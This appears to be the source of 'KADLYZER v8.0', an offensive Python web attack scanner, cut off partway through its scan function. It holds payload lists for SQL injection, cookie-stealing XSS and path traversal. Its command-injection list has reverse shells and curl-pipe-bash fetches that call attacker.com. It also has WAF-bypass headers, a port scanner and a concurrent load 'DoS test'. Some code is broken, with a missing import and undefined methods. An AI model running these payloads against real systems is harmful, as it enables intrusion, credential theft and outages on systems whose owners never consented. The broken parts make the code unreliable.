import requests
import socket
import json
import threading
import random
import base64
import time
import os
import argparse
import concurrent.futures
from urllib.parse import urlparse, urljoin
import logging
from datetime import datetime
import ssl
import re
import ipaddress
import urllib.parse
from bs4 import BeautifulSoup
import aiohttp
import asyncio
import statistics
import string

# ==============================
# KADLYZER v8.0 - Enhanced Version
# ==============================

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Advanced WAF bypass headers with rotating techniques
BYPASS_WAF_HEADERS = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36", 
     "X-Forwarded-For": "127.0.0.1", 
     "Accept-Language": "en-US,en;q=0.9"},
    
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15", 
     "X-Originating-IP": "127.0.0.1", 
     "Accept-Encoding": "gzip, deflate, br"},
    
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", 
     "Referer": "https://www.google.com/", 
     "DNT": "1"},
    
    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
     "CF-Connecting-IP": "127.0.0.1",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
    
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0", 
     "X-Real-IP": "127.0.0.1",
     "Connection": "keep-alive"},
     
    {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1",
     "X-Client-IP": "127.0.0.1",
     "Cache-Control": "max-age=0"},
]

# Enhanced and layered payloads for different vulnerability types
PAYLOADS = {
    "sql_injection": [
        "' OR '1'='1' --",
        "' OR 1=1 #",
        "' UNION SELECT 1,2,3,4,5--",
        "1' OR '1'='1",
        "1' AND 1=0 UNION SELECT null, CONCAT(username,':',password) FROM users --",
        "admin'--",
        base64.b64encode(b"' OR '1'='1' --").decode(),
        "UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x3c63656e7465723e3c696d673e,0x3c2f63656e7465723e3c646976207374796c653d22646973706c61793a6e6f6e65223e),NULL-- -",
        "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC)#",
        "AND (SELECT 2222 FROM(SELECT COUNT(*),CONCAT(0x7176627671,(SELECT (ELT(2222=2222,1))),0x7176627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
        "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))",
        "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,LOAD_FILE('/etc/passwd')-- -",
        "' AND SLEEP(5) AND 'a'='a"
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<ScRiPt>alert('XSS')</sCrIpT>",
        base64.b64encode(b"<script>alert('XSS')</script>").decode(),
        "<svg/onload=alert`1`>",
        "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://attacker.com/xss.js\';document.body.appendChild(a)')",
        "<img src=x onerror=this.src='https://attacker.com/'+document.cookie>",
        "<script>new Image().src='https://attacker.com/'+document.cookie;</script>",
        "<svg><script>fetch('https://attacker.com/'+document.cookie)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<script>Object.defineProperties(window, {chrome: {get: eval('fetch(\'https://attacker.com/\'+document.cookie)')}})</script>"
    ],
    "path_traversal": [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "C:\\Windows\\system.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
    ],
    "command_injection": [
        "'; ping -c 4 127.0.0.1 ;'",
        "& whoami &",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "'; nc -e /bin/sh attacker.com 4444 ;'",
        "; timeout 10 ping -c 4 127.0.0.1 ;",
        "|wget https://attacker.com/shell.php -O /tmp/shell.php;php /tmp/shell.php|",
        ";curl https://attacker.com/reverse.sh|bash;",
        "$(curl https://attacker.com/payload.txt|base64 -d|bash)",
        "|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'|",
        ";perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'|",
        "|ncat attacker.com 4444 -e /bin/bash|",
        ";bash -i >& /dev/tcp/attacker.com/4444 0>&1;"
    ],
    "ssrf": [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://localhost:11211/stats",
        "gopher://localhost:25/",
        "http://169.254.169.254/latest/meta-data/",
    ],
}

# Common HTTP status codes and their meanings
HTTP_STATUS_CODES = {
    200: "OK",
    201: "Created",
    301: "Moved Permanently",
    302: "Found",
    400: "Bad Request",
    401: "Unauthorized",
    403: "Forbidden",
    404: "Not Found",
    405: "Method Not Allowed",
    500: "Internal Server Error",
    502: "Bad Gateway",
    503: "Service Unavailable",
}

# Common directories to check for sensitive information
COMMON_DIRS = [
    "admin/",
    "login/",
    "wp-admin/",
    "backup/",
    "config/",
    ".git/",
    ".env",
    "api/",
    "phpmyadmin/",
    "dashboard/",
    "wp-content/",
    "administrator/",
    "install/",
    "db/",
    "logs/",
    "temp/",
    "test/",
    "dev/",
]

# Advanced port scanning with service identification
COMMON_PORTS = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    111: "RPC",
    135: "MSRPC",
    139: "NetBIOS",
    143: "IMAP",
    443: "HTTPS",
    445: "SMB",
    993: "IMAPS",
    995: "POP3S",
    1433: "MSSQL",
    1521: "Oracle",
    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",
    5900: "VNC",
    5985: "WinRM",
    6379: "Redis",
    8080: "HTTP-Proxy",
    8443: "HTTPS-Alt",
    27017: "MongoDB",
}

# Tambahkan teknik bypass WAF yang lebih advanced
ADVANCED_WAF_BYPASS = {
    "headers": [
        {
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "X-Originating-IP": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Host": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1"
        },
        {
            "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "X-Custom-IP-Authorization": "127.0.0.1"
        }
    ],
    "techniques": [
        "double_encode",
        "unicode_bypass",
        "case_switching",
        "null_byte",
        "path_bypass",
        "hex_encode",
        "comment_inject",
        "whitespace_manipulation",
        "charset_bypass",
        "protocol_pollution"
    ]
}

# Tambahkan payload untuk bypass WAF
BYPASS_PAYLOADS = {
    "sql_injection": [
        "%2f%2a*/union%2f%2a */select%2f%2a*/1,2,3--",
        "/*!50000union*//*!50000select*/1,2,3--",
        "%23%0Aunion%23%0Aselect%23%0A1,2,3--",
        "union /*!50000select*/ 1,2,3--",
        "/*!u%6eion*/ /*!se%6cect*/ 1,2,3--",
    ],
    "xss": [
        "&#x3C;img src=x onerror=alert(1)&#x3E;",
        "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<details/open/ontoggle=alert`1`>",
        "<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
    ]
}

# Tambahkan teknik serangan paralel yang lebih efisien
class ParallelScanner:
    def __init__(self, target_info, max_workers=100):
        self.target_info = target_info
        self.max_workers = max_workers
        self.results = {}
        self.session = requests.Session()
        
    async def async_scan(self):
        """Melakukan scanning secara asynchronous untuk kecepatan maksimal"""
        async with aiohttp.ClientSession() as session:
            tasks = []
            for vuln_type, payloads in PAYLOADS.items():
                for payload in payloads:
                    task = asyncio.create_task(self.test_payload(session, vuln_type, payload))
                    tasks.append(task)
            return await asyncio.gather(*tasks)

    def run_intensive_scan(self):
        """Menjalankan scan intensif dengan multiple threads"""
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            # Test semua endpoint potensial
            for endpoint in self.discover_endpoints():
                futures.extend([
                    executor.submit(self.test_sql_injection, endpoint),
                    executor.submit(self.test_xss, endpoint),
                    executor.submit(self.test_rce, endpoint),
                    executor.submit(self.test_lfi, endpoint),
                    executor.submit(self.test_xxe, endpoint)
                ])
            return futures

# Tambahkan payload yang lebih agresif
ADVANCED_PAYLOADS = {
    "sql_injection_time": [
        "' AND (SELECT 9999 FROM (SELECT(SLEEP(5)))a) AND 'a'='a",
        "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2))) AND 'a'='a",
        "1) AND SLEEP(5) AND (1=1",
        ") WAITFOR DELAY '0:0:5'--",
        "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--",
    ],
    "blind_sql": [
        "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a",
        "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>90--",
        "' AND (SELECT CASE WHEN (1=1) THEN BENCHMARK(5000000,SHA1('test')) ELSE 1 END)--",
    ],
    "xxe_injection": [
        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>""",
    ],
    "deserialization": [
        'O:8:"stdClass":1:{s:4:"pipe";s:3:"dir";}',
        'a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":1:{s:4:"pipe";s:3:"dir";}}',
    ]
}

# Tambahkan fungsi untuk serangan yang lebih akurat
class AdvancedVulnScanner:
    def __init__(self, target_info):
        self.target_info = target_info
        self.session = requests.Session()
        self.successful_payloads = []
        
    def validate_with_multiple_techniques(self, vuln_type, response, payload):
        """Validasi vulnerability dengan multiple teknik untuk mengurangi false positives"""
        validation_score = 0
        evidence = []
        
        # Analisis response time
        if hasattr(response, 'elapsed'):
            if response.elapsed.total_seconds() > 5:
                validation_score += 30
                evidence.append(f"High response time: {response.elapsed.total_seconds()}s")
        
        # Analisis response content
        content = response.text.lower()
        if any(error in content for error in [
            'sql syntax', 'mysql error', 'ora-', 'postgresql',
            'system.diagnostics', 'fatal error', 'internal server error'
        ]):
            validation_score += 25
            evidence.append("Error message detected")
        
        # Analisis response headers
        if 'X-Powered-By' in response.headers:
            validation_score += 10
            evidence.append(f"Technology disclosure: {response.headers['X-Powered-By']}")
            
        # Differential analysis
        clean_response = self.session.get(self.target_info['full_url'])
        if len(response.content) != len(clean_response.content):
            validation_score += 20
            evidence.append(f"Response length difference: {len(response.content) - len(clean_response.content)}")
        
        return {
            "score": validation_score,
            "evidence": evidence,
            "confirmed": validation_score >= 60
        }

    def perform_advanced_scan(self):
        """Melakukan scanning dengan teknik yang lebih advanced"""
        results = {}
        
        # Multi-threaded scanning untuk setiap jenis vulnerability
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            
            for vuln_type, payloads in {**PAYLOADS, **ADVANCED_PAYLOADS}.items():
                for payload in payloads:
                    futures.append(
                        executor.submit(self.test_payload, vuln_type, payload)
                    )
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        vuln_type = result['type']
                        if vuln_type not in results:
                            results[vuln_type] = []
                        results[vuln_type].append(result)
                except Exception as e:
                    logger.error(f"Error in scan: {str(e)}")
        
        return results

    def test_payload(self, vuln_type, payload):
        """Test individual payload dengan validasi yang lebih akurat"""
        try:
            # Prepare URL with payload
            test_url = f"{self.target_info['full_url']}?test={urllib.parse.quote(payload)}"
            
            # Send request with payload
            response = self.session.get(
                test_url,
                headers=random.choice(BYPASS_WAF_HEADERS),
                timeout=10,
                verify=False
            )
            
            # Validate response
            validation = self.validate_with_multiple_techniques(vuln_type, response, payload)
            
            if validation['confirmed']:
                return {
                    'type': vuln_type,
                    'payload': payload,
                    'url': test_url,
                    'evidence': validation['evidence'],
                    'score': validation['score']
                }
                
        except Exception as e:
            logger.debug(f"Payload test failed: {str(e)}")
        return None

# Tambahkan fungsi untuk DoS testing yang lebih efektif
def advanced_dos_test(target_info):
    """Test DoS vulnerability dengan teknik yang lebih advanced"""
    results = {
        "vulnerable": False,
        "evidence": [],
        "response_times": []
    }
    
    baseline_time = measure_response_time(target_info['full_url'])
    
    # Test dengan multiple concurrent connections
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [
            executor.submit(stress_test_request, target_info['full_url'])
            for _ in range(200)
        ]
        
        for future in concurrent.futures.as_completed(futures):
            try:
                response_time = future.result()
                results['response_times'].append(response_time)
                
                # If response time is significantly higher than baseline
                if response_time > baseline_time * 3:
                    results['vulnerable'] = True
                    results['evidence'].append(
                        f"Response time increased by {response_time/baseline_time:.1f}x"
                    )
            except Exception as e:
                logger.debug(f"DoS test error: {str(e)}")
    
    return results

def stress_test_request(url):
    """Perform stress test request with timing"""
    start_time = time.time()
    try:
        response = requests.get(url, timeout=10)
        return time.time() - start_time
    except:
        return 999  # High value to indicate failure

def measure_response_time(url):
    """Measure baseline response time"""
    times = []
    for _ in range(3):
        try:
            start = time.time()
            requests.get(url, timeout=5)
            times.append(time.time() - start)
        except:
            continue
    return statistics.mean(times) if times else 1.0

# Set up logging
def setup_logging():
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = os.path.join(log_dir, f"kadlyzer_{timestamp}.log")
    
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger("kadlyzer")

logger = setup_logging()

def banner():
    print(f"""{Colors.CYAN}

██╗  ██╗ █████╗ ██████╗ ██╗  ██╗   ██╗███████╗███████╗██████╗ 
██║ ██╔╝██╔══██╗██╔══██╗██║  ╚██╗ ██╔╝╚══███╔╝██╔════╝██╔══██╗
█████╔╝ ███████║██║  ██║██║   ╚████╔╝   ███╔╝ █████╗  ██████╔╝
██╔═██╗ ██╔══██║██║  ██║██║    ╚██╔╝   ███╔╝  ██╔══╝  ██╔══██╗
██║  ██╗██║  ██║██████╔╝███████╗██║   ███████╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝
                                                              
{Colors.BOLD}{Colors.GREEN}KADLYZER v8.0 - Enhanced Security Testing Tool{Colors.ENDC}
{Colors.WARNING}For authorized security testing only{Colors.ENDC}
    """)

def validate_target(target):
    """Validate and normalize the target input."""
    if not target:
        raise ValueError("Target cannot be empty")
    
    # Add http:// prefix if no scheme provided
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse the URL
    parsed_url = urlparse(target)
    domain = parsed_url.netloc
    
    # If domain includes port, strip it for some operations
    if ':' in domain:
        domain = domain.split(':')[0]
    
    return {
        'full_url': target,
        'domain': domain,
        'scheme': parsed_url.scheme,
        'path': parsed_url.path,
        'parsed_url': parsed_url
    }

def recon(target_info):
    """Enhanced reconnaissance function."""
    domain = target_info['domain']
    logger.info(f"Starting reconnaissance on {domain}...")
    
    results = {
        "ip_addresses": [],
        "whois_data": None,
        "dns_records": {},
        "ssl_info": {}
    }
    
    try:
        # Get IP address(es)
        ips = socket.gethostbyname_ex(domain)
        main_ip = ips[2][0]
        results["ip_addresses"] = ips[2]
        logger.info(f"IP Target: {main_ip} (+ {len(ips[2])-1} additional)")

        # Get WHOIS information
        try:
            response = requests.get(f"https://api.hackertarget.com/whois/?q={domain}", timeout=10)
            if response.status_code == 200:
                results["whois_data"] = response.text
                logger.info(f"WHOIS Data retrieved successfully")
            else:
                logger.warning(f"WHOIS request failed: {response.status_code}")
        except Exception as e:
            logger.error(f"WHOIS API error: {str(e)}")

        # Check SSL certificate if HTTPS
        if target_info['scheme'] == 'https':
            try:
                context = ssl.create_default_context()
                with socket.create_connection((domain, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=domain) as ssock:
                        cert = ssock.getpeercert()
                        results["ssl_info"] = {
                            "issuer": dict(x[0] for x in cert['issuer']),
                            "subject": dict(x[0] for x in cert['subject']),
                            "version": cert['version'],
                            "not_before": cert['notBefore'],
                            "not_after": cert['notAfter']
                        }
                        logger.info(f"SSL Certificate: Valid until {cert['notAfter']}")
            except Exception as e:
                logger.error(f"SSL certificate check failed: {str(e)}")

        # Try to get DNS records
        try:
            # A record already retrieved
            results["dns_records"]["A"] = results["ip_addresses"]
            
            # Try for other common record types using hackertarget API
            response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=10)
            if response.status_code == 200:
                dns_text = response.text
                logger.info(f"DNS records retrieved successfully")
                
                # Parse the DNS records from the text response
                record_types = ["MX", "NS", "CNAME", "TXT", "SOA"]
                for record_type in record_types:
                    pattern = re.compile(rf"{domain}\.\s+\d+\s+IN\s+{record_type}\s+(.*)")
                    matches = pattern.findall(dns_text)
                    if matches:
                        results["dns_records"][record_type] = matches
            else:
                logger.warning(f"DNS lookup request failed: {response.status_code}")
        except Exception as e:
            logger.error(f"DNS lookup error: {str(e)}")

        return results

    except Exception as e:
        logger.error(f"Reconnaissance failed: {str(e)}")
        return results

def scan_ports(target_info, max_threads=100, timeout=1.0, scan_all=False):
    """Enhanced port scanner with service detection"""
    domain = target_info['domain']
    logger.info(f"Starting port scan on {domain}...")
    
    # Determine which ports to scan
    ports_to_scan = list(COMMON_PORTS.keys()) if not scan_all else range(1, 65536)
    
    try:
        ip = socket.gethostbyname(domain)
        open_ports = {}
        
        def check_port(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                result = s.connect_ex((ip, port))
                s.close()
                
                if result == 0:
                    service = COMMON_PORTS.get(port, "Unknown")
                    # Try banner grabbing for additional info
                    banner = grab_banner(ip, port)
                    open_ports[port] = {
                        "service": service,
                        "banner": banner
                    }
                    logger.info(f"Port {port} ({service}) is open")
            except Exception as e:
                pass
        
        # Use thread pool for faster scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(check_port, ports_to_scan)
        
        if open_ports:
            logger.info(f"Found {len(open_ports)} open ports")
            for port, info in sorted(open_ports.items()):
                logger.info(f"  {port}/tcp - {info['service']}" + (f" - {info['banner']}" if info['banner'] else ""))
        else:
            logger.warning("No open ports found")
        
        return open_ports
        
    except Exception as e:
        logger.error(f"Port scanning failed: {str(e)}")
        return {}

def grab_banner(ip, port, timeout=2):
    """Attempt to grab service banner from open port"""
    banner = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        
        # For HTTP/HTTPS ports, send a HTTP request
        if port in [80, 443, 8080, 8443]:
            s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
        else:
            # For other ports, just wait for banner
            pass
        
        banner_data = s.recv(1024)
        banner = banner_data.decode('utf-8', errors='ignore').strip()
        # Truncate banner if too long
        if len(banner) > 40:
            banner = banner[:37] + "..."
    except:
        pass
    finally:
        try:
            s.close()
        except:
            pass
    return banner

def bypass_waf(target_info):
    """Enhanced WAF detection and bypass attempts"""
    url = target_info['full_url']
    logger.info(f"Testing WAF presence and bypass methods on {url}...")
    
    waf_results = {
        "waf_detected": False,
        "waf_type": None,
        "bypass_successful": False,
        "successful_method": None,
        "fingerprints": []
    }
    
    # First, check standard response
    try:
        standard_response = requests.get(url, timeout=10, allow_redirects=True)
        standard_headers = standard_response.headers
        
        # Check for WAF fingerprints in headers
        waf_fingerprints = {
            "Cloudflare": ["cf-ray", "cloudflare"],
            "AWS WAF": ["x-amzn-waf"],
            "Akamai": ["akamai"],
            "Imperva": ["incapsula"],
            "F5 BIG-IP ASM": ["x-f5-id"],
            "ModSecurity": ["mod_security"],
            "Sucuri": ["sucuri"]
        }
        
        for waf_name, signatures in waf_fingerprints.items():
            for header_key, header_value in standard_headers.items():
                for signature in signatures:
                    if signature.lower() in header_key.lower() or signature.lower() in header_value.lower():
                        waf_results["waf_detected"] = True
                        waf_results["waf_type"] = waf_name
                        waf_results["fingerprints"].append(f"{header_key}: {header_value}")
                        logger.info(f"WAF detected: {waf_name}")
                        break
        
        # If no specific WAF identified by headers, check for behavior
        if not waf_results["waf_detected"]:
            # Send a simple payload that would trigger most WAFs
            test_url = url + "?test=<script>alert(1)</script>"
            test_response = requests.get(test_url, timeout=10)
            
            # Check if response differs substantially or returns security error pages
            if test_response.status_code in [403, 406, 429, 503] or "security" in test_response.text.lower() or "blocked" in test_response.text.lower():
                waf_results["waf_detected"] = True
                waf_results["waf_type"] = "Unknown WAF"
                logger.info(f"Generic WAF detected based on behavior")
        
        # Now try various bypass techniques
        if waf_results["waf_detected"]:
            for i, header in enumerate(BYPASS_WAF_HEADERS):
                try:
                    bypass_response = requests.get(url, headers=header, timeout=10)
                    if bypass_response.status_code == 200:
                        logger.info(f"Potential WAF bypass with headers: {header}")
                        # Verify bypass with a light test payload
                        test_url = url + "?id=1' or '1'='1"
                        test_with_headers = requests.get(test_url, headers=header, timeout=10)
                        
                        if test_with_headers.status_code == 200 and "forbidden" not in test_with_headers.text.lower():
                            waf_results["bypass_successful"] = True
                            waf_results["successful_method"] = f"Method {i+1}"
                            logger.info(f"WAF bypass confirmed with method {i+1}")
                            break
                except Exception as e:
                    logger.debug(f"Bypass attempt {i+1} failed: {str(e)}")
                    
            if not waf_results["bypass_successful"]:
                logger.warning("Could not bypass WAF with standard methods")
        else:
            logger.info("No WAF detected")
    
    except Exception as e:
        logger.error(f"WAF detection failed: {str(e)}")
    
    return waf_results

def directory_scan(target_info, threads=10):
    """Scan for common directories and files"""
    base_url = target_info['full_url']
    logger.info(f"Scanning for sensitive directories and files on {base_url}...")
    
    found_dirs = {}
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_dir = {executor.submit(check_directory, base_url, directory): directory for directory in COMMON_DIRS}
        for future in concurrent.futures.as_completed(future_to_dir):
            directory = future_to_dir[future]
            try:
                result = future.result()
                if result:
                    found_dirs[directory] = result
                    logger.info(f"Found: {result['url']} ({result['status_code']} - {result['content_length']} bytes)")
            except Exception as e:
                logger.debug(f"Error checking {directory}: {str(e)}")
    
    if not found_dirs:
        logger.info("No interesting directories found")
    else:
        logger.info(f"Found {len(found_dirs)} interesting directories/files")
    
    return found_dirs

def check_directory(base_url, directory):
    """Check if a directory exists and collect information about it"""
    url = urljoin(base_url, directory)
    try:
        headers = random.choice(BYPASS_WAF_HEADERS)
        response = requests.get(url, headers=headers, timeout=5, allow_redirects=False)
        
        # Only return "interesting" results (not 404s)
        if response.status_code != 404:
            return {
                "url": url,
                "status_code": response.status_code,
                "status": HTTP_STATUS_CODES.get(response.status_code, "Unknown"),
                "content_length": len(response.content),
                "title": extract_title(response.text) if response.headers.get('content-type', '').startswith('text/html') else None
            }
        return None
    except:
        return None

def extract_title(html):
    """Extract title from HTML content"""
    match = re.search(r"<title>(.*?)</title>", html, re.IGNORECASE)
    if match:
        return match.group(1)
    return None

def validate_vulnerability(vuln_type, response, payload, url):
    """Validasi vulnerability dengan multiple checks untuk mengurangi false positives"""
    content = response.text.lower()
    headers = response.headers
    status_code = response.status_code
    
    # Validasi dasar
    if status_code == 404:
        return False
        
    validation_results = {
        "confirmed": False,
        "confidence": 0,
        "evidence": []
    }

    if vuln_type == "sql_injection":
        # Check SQL error patterns
        sql_errors = [
            "sql syntax",
            "mysql error",
            "mysql_fetch_array",
            "ora-[0-9]",
            "postgresql error",
            "sqlserver_start_procedure",
            "unclosed quotation mark",
            "you have an error in your sql syntax"
        ]
        
        # Check database output patterns
        db_outputs = [
            r"\b\d+\s+rows?\s+selected?\b",
            r"<td>\s*\d+\s*</td>",
            r"\[(.*?)\]",
            r"array\s*\("
        ]
        
        # Validasi dengan multiple payloads
        confirmation_payloads = [
            "' OR '1'='1",
            "' AND '1'='2",
            "1 UNION SELECT NULL--"
        ]
        
        base_response = requests.get(url, headers=headers, timeout=10)
        base_content_length = len(base_response.text)
        
        for test_payload in confirmation_payloads:
            test_url = url + test_payload
            test_response = requests.get(test_url, headers=headers, timeout=10)
            
            # Compare responses
            if abs(len(test_response.text) - base_content_length) > 100:
                validation_results["confidence"] += 30
                validation_results["evidence"].append(f"Response length difference: {abs(len(test_response.text) - base_content_length)}")
        
        # Check for SQL errors
        for error in sql_errors:
            if re.search(error, content, re.I):
                validation_results["confidence"] += 25
                validation_results["evidence"].append(f"SQL error pattern found: {error}")
        
        # Check for database output patterns
        for pattern in db_outputs:
            if re.search(pattern, content):
                validation_results["confidence"] += 20
                validation_results["evidence"].append(f"Database output pattern found: {pattern}")

    elif vuln_type == "xss":
        # Validasi XSS dengan DOM parsing
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check if payload is reflected in dangerous contexts
            script_tags = soup.find_all('script')
            event_handlers = soup.find_all(lambda tag: any(attr.startswith('on') for attr in tag.attrs))
            
            payload_encoded = [
                payload,
                html.escape(payload),
                urllib.parse.quote(payload)
            ]
            
            for p in payload_encoded:
                if p in response.text:
                    validation_results["confidence"] += 30
                    validation_results["evidence"].append(f"Payload reflected: {p}")
                
            if script_tags:
                validation_results["confidence"] += 25
                validation_results["evidence"].append(f"Found in <script> tags: {len(script_tags)}")
                
            if event_handlers:
                validation_results["confidence"] += 25
                validation_results["evidence"].append(f"Found in event handlers: {len(event_handlers)}")
                
        except Exception as e:
            logger.debug(f"XSS validation error: {str(e)}")

    elif vuln_type == "path_traversal":
        # Check for file content patterns
        file_patterns = {
            "unix_passwd": r"root:.*:0:0:",
            "win_ini": r"\[.*\].*=.*",
            "proc_self": r"cwd.*groups.*cmdline",
            "etc_shadow": r"root:\$.*:.*:.*"
        }
        
        for pattern_name, pattern in file_patterns.items():
            if re.search(pattern, content):
                validation_results["confidence"] += 35
                validation_results["evidence"].append(f"File content pattern found: {pattern_name}")
        
        # Check for directory listing
        if "index of /" in content or "directory listing for" in content:
            validation_results["confidence"] += 25
            validation_results["evidence"].append("Directory listing detected")

    elif vuln_type == "command_injection":
        # Check for command output patterns
        cmd_patterns = {
            "unix_id": r"uid=\d+\(.*\)\s+gid=\d+\(.*\)",
            "win_dir": r"volume in drive|volume serial number|directory of",
            "ping_output": r"bytes=\d+\s+time=\d+ms",
            "whoami": r"nt authority|root:|unix:"
        }
        
        for pattern_name, pattern in cmd_patterns.items():
            if re.search(pattern, content):
                validation_results["confidence"] += 35
                validation_results["evidence"].append(f"Command output pattern found: {pattern_name}")
        
        # Test with time-based validation
        time_payload = "; ping -c 3 127.0.0.1 ;"
        start_time = time.time()
        test_response = requests.get(url + time_payload, headers=headers, timeout=15)
        execution_time = time.time() - start_time
        
        if execution_time > 3:
            validation_results["confidence"] += 30
            validation_results["evidence"].append(f"Time-based validation: {execution_time:.2f}s delay")

    elif vuln_type == "ssrf":
        # Check for internal service responses
        service_patterns = {
            "aws_metadata": r"ami-id|instance-id|security-credentials",
            "internal_service": r"(apache|nginx|iis|jetty|tomcat)",
            "cloud_metadata": r"compute.internal|metadata.google.internal|oracle.cloud.internal"
        }
        
        for pattern_name, pattern in service_patterns.items():
            if re.search(pattern, content):
                validation_results["confidence"] += 35
                validation_results["evidence"].append(f"Internal service pattern found: {pattern_name}")
        
        # Check for specific status codes and headers
        if status_code in [301, 302, 307]:
            location = headers.get('location', '')
            if any(internal in location for internal in ['localhost', '127.0.0.1', '169.254', '10.', '172.16', '192.168']):
                validation_results["confidence"] += 30
                validation_results["evidence"].append(f"Internal redirect detected: {location}")

    # Determine if vulnerability is confirmed based on confidence score
    validation_results["confirmed"] = validation_results["confidence"] >= 60
    
    return validation_results

def vulnerability_scan(target_info, waf_bypass_headers=None):
    """Enhanced vulnerability scanning with improved accuracy"""
    url = target_info['full_url']
